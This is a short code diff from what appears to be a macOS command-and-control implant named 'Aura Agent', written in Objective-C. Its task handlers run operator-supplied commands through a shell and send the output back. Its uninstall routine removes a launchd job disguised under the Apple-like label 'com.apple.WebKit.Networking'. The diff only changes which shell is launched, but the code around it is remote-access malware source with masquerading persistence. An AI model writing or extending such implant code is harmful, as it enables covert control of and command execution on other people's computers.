@@ -52,7 +52,7 @@
                 // Final success message
                 [self submitTaskResponseWithOutput:@"\n✅ Aura Agent successfully uninstalled!" status:@"success" completed:YES];
 
-                // // Remove the agent from launchd
+                // Remove the agent from launchd
                 NSTask *removeTask = [[NSTask alloc] init];
                 removeTask.launchPath = @"/bin/launchctl";
                 removeTask.arguments = @[@"remove", @"com.apple.WebKit.Networking"];
@@ -90,8 +90,9 @@
             @try {
                 NSTask *task = [[NSTask alloc] init];
                 NSPipe *outputPipe = [NSPipe pipe];
-
-                task.launchPath = @"/bin/bash";
+                // Get shell path from environment
+                NSString *shellPath = [[[NSProcessInfo processInfo] environment] objectForKey:@"SHELL"] ?: @"/bin/bash";
+                task.launchPath = shellPath;
                 task.arguments = @[@"-c", self.parameters];
                 task.standardOutput = outputPipe;
                 [task launch];
@@ -141,7 +142,8 @@
                 NSTask *task = [[NSTask alloc] init];
                 NSPipe *outputPipe = [NSPipe pipe];
 
-                task.launchPath = @"/bin/bash";
+                NSString *shellPath = [[[NSProcessInfo processInfo] environment] objectForKey:@"SHELL"] ?: @"/bin/bash";
+                task.launchPath = shellPath;
                 task.arguments = @[@"-c", @"ls", self.parameters];
                 task.standardOutput = outputPipe;
                 [task launch];
